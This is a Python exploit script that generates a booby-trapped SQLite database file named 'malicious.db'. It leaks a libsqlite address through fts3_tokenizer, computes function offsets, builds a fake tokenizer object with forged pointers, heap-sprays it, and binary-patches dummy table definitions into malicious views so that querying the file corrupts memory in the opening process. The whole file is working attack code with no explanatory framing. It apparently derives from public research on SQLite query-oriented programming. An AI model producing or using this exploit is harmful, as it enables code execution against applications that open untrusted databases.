import os
import random
import string
import sqlite3


def gen_int2hex_map():
    conn.execute("CREATE TABLE hex_map (int INTEGER, val BLOB);")
    for i in range(256):
        conn.execute("INSERT INTO hex_map VALUES ({}, x'{}');".format(i, ''.join('%02x' % i)))


def math_with_const(output_view, table_operand, operator, const_operand):
    return "CREATE VIEW {} AS SELECT ( (SELECT * FROM {} ) {} ( SELECT '{}') ) as col;".format(output_view,
                                                                                               table_operand, operator,
                                                                                               const_operand)


def p64(output_view, input_view):
    return """CREATE VIEW {0} AS SELECT cast(
    (SELECT val FROM hex_map WHERE int = (((select col from {1}) / 1) % 256))||
    (SELECT val FROM hex_map WHERE int = (((select col from {1}) / (1 <<  8)) % 256))||
    (SELECT val FROM hex_map WHERE int = (((select col from {1}) / (1 << 16)) % 256))||    
    (SELECT val FROM hex_map WHERE int = (((select col from {1}) / (1 << 24)) % 256))||
    (SELECT val FROM hex_map WHERE int = (((select col from {1}) / (1 << 32)) % 256))||
    (SELECT val FROM hex_map WHERE int = (((select col from {1}) / (1 << 40)) % 256))||
    (SELECT val FROM hex_map WHERE int = (((select col from {1}) / (1 << 48)) % 256))||
    (SELECT val FROM hex_map WHERE int = (((select col from {1}) / (1 << 56)) % 256)) as blob) as col;""".format(output_view, input_view)


def u64(output_view, input_view):
    return """CREATE VIEW {0} AS SELECT (
    (SELECT ((instr("0123456789ABCDEF", substr((SELECT col FROM {1}), -1,  1)) -1) * (1 <<  0))) +
    (SELECT ((instr("0123456789ABCDEF", substr((SELECT col FROM {1}), -2,  1)) -1) * (1 <<  4))) +
    (SELECT ((instr("0123456789ABCDEF", substr((SELECT col FROM {1}), -3,  1)) -1) * (1 <<  8))) +
    (SELECT ((instr("0123456789ABCDEF", substr((SELECT col FROM {1}), -4,  1)) -1) * (1 << 12))) + 
    (SELECT ((instr("0123456789ABCDEF", substr((SELECT col FROM {1}), -5,  1)) -1) * (1 << 16))) +
    (SELECT ((instr("0123456789ABCDEF", substr((SELECT col FROM {1}), -6,  1)) -1) * (1 << 20))) +
    (SELECT ((instr("0123456789ABCDEF", substr((SELECT col FROM {1}), -7,  1)) -1) * (1 << 24))) +
    (SELECT ((instr("0123456789ABCDEF", substr((SELECT col FROM {1}), -8,  1)) -1) * (1 << 28))) +
    (SELECT ((instr("0123456789ABCDEF", substr((SELECT col FROM {1}), -9,  1)) -1) * (1 << 32))) +
    (SELECT ((instr("0123456789ABCDEF", substr((SELECT col FROM {1}), -10, 1)) -1) * (1 << 36))) +
    (SELECT ((instr("0123456789ABCDEF", substr((SELECT col FROM {1}), -11, 1)) -1) * (1 << 40))) +
    (SELECT ((instr("0123456789ABCDEF", substr((SELECT col FROM {1}), -12, 1)) -1) * (1 << 44))) + 
    (SELECT ((instr("0123456789ABCDEF", substr((SELECT col FROM {1}), -13, 1)) -1) * (1 << 48))) +
    (SELECT ((instr("0123456789ABCDEF", substr((SELECT col FROM {1}), -14, 1)) -1) * (1 << 52))) +
    (SELECT ((instr("0123456789ABCDEF", substr((SELECT col FROM {1}), -15, 1)) -1) * (1 << 56))) +
    (SELECT ((instr("0123456789ABCDEF", substr((SELECT col FROM {1}), -16, 1)) -1) * (1 << 60)))) as col;""".format(output_view, input_view)


def fake_obj(output_view, ptr_list):
    if not isinstance(ptr_list, list):
            raise TypeError('fake_obj() ptr_list is not a list') 
    from_string = [i.split(".")[0] for i in ptr_list if not i.startswith("x")]
    from_string[0] = "FROM " + from_string[0]
    ptrs = "||".join(ptr_list)
    return """CREATE VIEW {0} AS SELECT {1} {2};""".format(output_view, ptrs, " JOIN ".join(from_string))

def heap_spray(output_view, spray_count, sprayed_obj):
    return """CREATE VIEW {0} AS SELECT replace(hex(zeroblob({1})), "00", (SELECT * FROM {2}));""".format(output_view, spray_count, sprayed_obj)

def flip_end(output_view, input_view):
    return """CREATE VIEW {0} AS SELECT
                SUBSTR((SELECT col FROM {1}), -2, 2)||
                SUBSTR((SELECT col FROM {1}), -4, 2)||
                SUBSTR((SELECT col FROM {1}), -6, 2)||
                SUBSTR((SELECT col FROM {1}), -8, 2)||
                SUBSTR((SELECT col FROM {1}), -10, 2)||
                SUBSTR((SELECT col FROM {1}), -12, 2)||
                SUBSTR((SELECT col FROM {1}), -14, 2)||
                SUBSTR((SELECT col FROM {1}), -16, 2) AS col;""".format(output_view, input_view)


def gen_dummy_DDL_stmt(stmt_len):
    table_name = "".join(random.choice(string.ascii_lowercase) for i in range(6))
    base = ("CREATE TABLE {} (a text)".format(table_name))
    assert len(base) < stmt_len
    ret = "CREATE TABLE {} (a{} text)".format(table_name, 'a' * (stmt_len - len(base)))
    return ret


def patch(db_file, old, new):
    assert (len(old) == len(new))
    with open(db_file, "rb") as rfd:
        content = rfd.read()
        offset = content.find(old)
        assert (offset > 100)  # offset found and bigger then sqlite header
        patched = content[:offset] + new + content[offset + len(old):]
    with open(db_file, "wb") as wfd:
        wfd.write(patched)


if __name__ == "__main__":
    DB_FILENAME = 'malicious.db'
    SIMPLE_MODULE_OFFSET =  str(0x002C3820)
    SIMPLE_CREATE_OFFSET =  str(0x0002A790)
    SIMPLE_DESTROY_OFFSET = str(0x0001B3D0)

    conn = sqlite3.connect(DB_FILENAME)

    conn.execute("PRAGMA page_size = 65536;")  # long DDL statements tend to split with default page size.
    gen_int2hex_map()
    qop_chain = []
    
    print("[+] Generating binary leak statements")
    qop_chain.append('CREATE VIEW le_bin_leak AS SELECT hex(fts3_tokenizer("simple")) AS col;')
    qop_chain.append(flip_end('bin_leak', 'le_bin_leak'))
    qop_chain.append(u64('u64_bin_leak', 'bin_leak'))

    print("[+] Generating offsets calculation statements")
    qop_chain.append(math_with_const('u64_libsqlite_base', 'u64_bin_leak', '-', SIMPLE_MODULE_OFFSET))

    qop_chain.append(math_with_const('u64_simple_create', 'u64_libsqlite_base', '+', SIMPLE_CREATE_OFFSET))
    qop_chain.append(p64('p64_simple_create', 'u64_simple_create'))

    qop_chain.append(math_with_const('u64_simple_destroy', 'u64_libsqlite_base', '+', SIMPLE_DESTROY_OFFSET))
    qop_chain.append(p64('p64_simple_destroy', 'u64_simple_destroy'))

    print("[+] Generating Heap Spray statements")
    qop_chain.append(fake_obj('fake_tokenizer', ["x'4141414141414141'", "p64_simple_create.col", "p64_simple_destroy.col", "x'4242424242424242'"]))
    qop_chain.append(heap_spray('heap_spray', 10000, 'fake_tokenizer'))

    print("[+] Generating dummy DDL statements to be patched")
    dummies = []
    for q_stmt in qop_chain:
        dummies.append(gen_dummy_DDL_stmt(len(q_stmt)))
        conn.execute(dummies[-1])

    conn.commit()
    print("[+] Patching commited dummy DDL statements")
    for d_stmt, q_stmt in zip(dummies, qop_chain):
        patch(DB_FILENAME, d_stmt, q_stmt)
    print("[+] All Done")